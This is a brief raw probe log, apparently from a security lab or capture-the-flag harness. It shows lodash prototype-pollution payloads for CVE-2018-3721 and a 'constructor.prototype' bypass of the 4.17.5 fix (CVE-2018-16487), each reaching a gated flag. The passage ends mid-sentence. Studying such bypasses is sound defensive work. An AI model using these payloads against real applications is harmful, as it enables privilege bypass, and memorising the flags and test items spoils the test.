== Raw probe evidence (GET /probe?payload=<json-encoded object to merge>) ==

--- SEED (CVE-2018-3721): payload={"__proto__":{"pcbUnlock":true}} ---
seed@v0 (lodash 4.17.4, no safeGet):     polluted=true,  gated_secret=PCBFLAG_1c5e37c8c907c827ff3efb9d7f8dc48f   => REACHES FLAG
    (no safeGet -> baseMergeDeep reads object['__proto__']==Object.prototype and merges pcbUnlock onto it)
seed@v1 (lodash 4.17.5, __proto__ guard): polluted=false, gated_secret=denied  => BLOCKED
    (safeGet returns undefined for key '__proto__' -> recursion never steps onto Object.prototype)

--- RESIDUAL (CVE-2018-16487): payload={"constructor":{"prototype":{"pcbUnlock":true}}} ---
residual@v1 (lodash 4.17.5): polluted=true,  gated_secret=PCBFLAG_1c5e37c8c907c827ff3efb9d7f8dc48f   => REACHES FLAG (bypass)
    (safeGet special-cases ONLY '__proto__'; 'constructor' returns the real Object function, and this
